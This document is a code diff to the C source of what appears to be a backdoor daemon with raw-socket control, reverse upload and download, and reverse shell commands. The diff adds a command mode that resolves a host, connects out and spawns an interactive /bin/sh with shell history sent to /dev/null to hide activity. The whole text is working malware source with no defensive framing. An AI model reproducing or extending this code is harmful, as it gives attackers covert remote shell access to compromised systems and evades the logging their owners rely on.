@@ -14,6 +14,7 @@
 #include <sys/ioctl.h>
 #include <sys/wait.h>
 #include <termios.h>
+#include <netdb.h>
 
 
 #include "raw.h"
@@ -26,6 +27,26 @@
 
 int weekday;
 struct rawsock rawsocks[MAXDIRECTRAW];
+
+char *envp[] = {
+     "TERM=linux",
+     "SHELL=/bin/sh",
+     "BASH_ENV=/dev/null",
+     "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# ",
+     "HISTFILE=/dev/null",
+     "HOME=" HOME,
+     "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:" HOME ":" HOME "/bin",
+     NULL
+};
+
+char  *argv[] = {
+      "/bin/sh",
+      "--noprofile",
+      "--norc",
+      "-i",
+      NULL
+};
+
 
 // Debug function
 __inline__ void debug(char * format, ...){
@@ -149,7 +170,7 @@ void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
     close(fd);
 }
 
-int launcher_rcon(struct in_addr *ip, unsigned short port) {
+int launcher_rcon(unsigned long ip, unsigned short port) {
     int sock;
     struct sockaddr_in cli;
 
@@ -159,7 +180,7 @@ int launcher_rcon(struct in_addr *ip, unsigned short port) {
     memset(&cli, 0, sizeof(cli));
     cli.sin_family = AF_INET;
     cli.sin_port = htons(port);
-    cli.sin_addr = *ip;
+    cli.sin_addr.s_addr = ip;
 
     if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
         close(sock);
@@ -241,8 +262,9 @@ void launcher_shell(int sockr, int sockw) {
         if (getuid()) chdir("/var/tmp");
         else chdir(HOME);
         // overwrite the PS1 to know that you are in "skd mode"
-        putenv(PS1);
-        execl("/bin/sh", "sh", "--norc", "-i", NULL);
+//        putenv(PS1);
+        execve("/bin/sh", argv, envp);
+//        execl("/bin/sh", "sh", "--norc", "-i", NULL);
 
         // we should not to be here
         exit(1);
@@ -334,7 +356,7 @@ void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
                 debug("Starting DirectRAW service\n");
                 struct rawsock *r = findrawsock(d->port);
                 int pid;
-                if ((pid = swapd_raw(r, ip->s_addr, source, d->port, SERVERAUTH)) > 0) {
+                if ((pid = swapd_raw(r, ip->s_addr, source, d->port, (unsigned char *)SERVERAUTH)) > 0) {
                     debug("done!\n");
                     launcher_shell(r->r[0], r->w[1]);
                     kill(pid, 15);
@@ -346,21 +368,21 @@ void do_action(struct data *d, struct in_addr *ip, short source,  int sock) {
             break;
         case RUPLOAD:
             debug("Reverse uploading file\n");
-            if ((sock = launcher_rcon(ip, d->port))) {
+            if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_upload(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
             }
             break;
         case RDOWNLOAD:
             debug("Reverse downloading file\n");
-            if ((sock = launcher_rcon(ip, d->port))) {
+            if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_download(sock, sock, (char *)d->bytes, d->size);
                 close(sock);
             }
             break;
         case RSHELL:
             debug("Launching reverse shell\n");
-            if ((sock = launcher_rcon(ip, d->port))) {
+            if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                 launcher_shell(sock, sock);
                 close(sock);
             }
@@ -463,6 +485,21 @@ void raw_daemon() {
         }
     }
 }
+
+unsigned long resolve(const char *host, char *ip) {
+    struct hostent *he;
+    struct sockaddr_in si;
+
+    he = gethostbyname(host);
+    if (!he) {
+        return INADDR_NONE;
+    }
+    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
+    strcpy(ip, inet_ntoa(si.sin_addr));
+    return si.sin_addr.s_addr;
+}
+
+
 /*
  * How to launch the server:
  * 1 => without params as root for a raw socket
@@ -474,7 +511,22 @@ int main(int argc, char **argv) {
 
     // Command mode
     if (argc == 3){
-        // Connect to argv[1]:argv[2]
+        unsigned short port = atoi(argv[2]);
+        unsigned long ip;
+        char ipname[64];
+        int sock;
+        debug("Iniciant reverse tty\n");
+        ip = resolve(argv[1], ipname);
+        if (ip == INADDR_NONE) {
+            perror(argv[1]);
+            return 1;
+        }
+        debug("Connecting to %s:%d\n",ipname,port);
+        if ((sock = launcher_rcon(ip, port))) {
+            launcher_shell(sock, sock);
+            close(sock);
+        }
+ 
         return 0;
     } else if (argc == 2) {
         port = atoi(argv[1]);    
